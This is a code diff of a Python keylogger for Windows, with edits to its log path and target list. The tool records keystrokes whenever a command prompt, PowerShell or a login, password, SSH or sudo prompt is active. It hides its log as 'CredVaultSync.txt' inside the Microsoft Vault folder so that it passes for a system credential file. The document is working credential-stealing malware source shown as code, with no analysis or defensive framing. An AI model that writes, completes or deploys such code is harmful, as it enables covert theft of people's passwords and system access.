@@ -8,13 +8,13 @@ import win32console, win32gui
 import os
 # Keyboard needed to grab key events
 
-path = r"C:\Users\AppData\Roaming\Microsoft\Vault\CredVaultSync.txt"
+path = r"C:\Users\Default\AppData\Roaming\Microsoft\Vault\CredVaultSync.txt"
 # if path doesn't exist, create it. 
 
 if not os.path.exists(os.path.dirname(path)):
     os.makedirs(os.path.dirname(path))
 
-targets = ["cmd.exe", "powershell", "command prompt"]
+targets = ["cmd.exe", "powershell", "command_prompt"]
 internal_targets = ["Login", "Sign In", "Password", "Sudo", "su", "SSH", "king", "duke", "knight", "lady", "baron", "scribe", "apothecary", "shepard", "blacksmith", "herald"]
 
 buffer = ""
@@ -47,7 +47,6 @@ def log_when_pressed(key):
         
         # Only grab the key/password if it is involved in a login
         
-
         if any(target.lower() in current_window.lower() for target in targets) or any(i in inside_text for i in internal_targets):
             # makes a note of what is being displayed when the password is logged
             if current_window != last_window:
